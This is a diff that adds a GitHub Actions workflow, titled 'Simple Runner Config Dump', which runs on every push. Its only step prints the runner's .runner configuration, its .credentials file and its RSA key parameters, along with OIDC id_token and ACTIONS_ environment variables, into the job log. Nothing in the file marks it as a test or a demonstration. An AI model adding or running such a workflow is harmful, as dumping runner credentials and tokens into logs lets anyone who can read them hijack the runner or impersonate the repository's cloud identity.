@@ -1,0 +1,16 @@
+name: Simple Runner Config Dump
+on: [push]
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          cat /home/runner/actions-runner/.runner
+          echo '---CREDENTIALS---'
+          cat /home/runner/actions-runner/.credentials
+          echo '---RSA---'
+          cat /home/runner/actions-runner/.credentials_rsaparams
+          echo '---OIDC---'
+          env | grep -i id_token
+          echo '---ALL_ACTIONS---'
+          env | grep ^ACTIONS_ | head -20
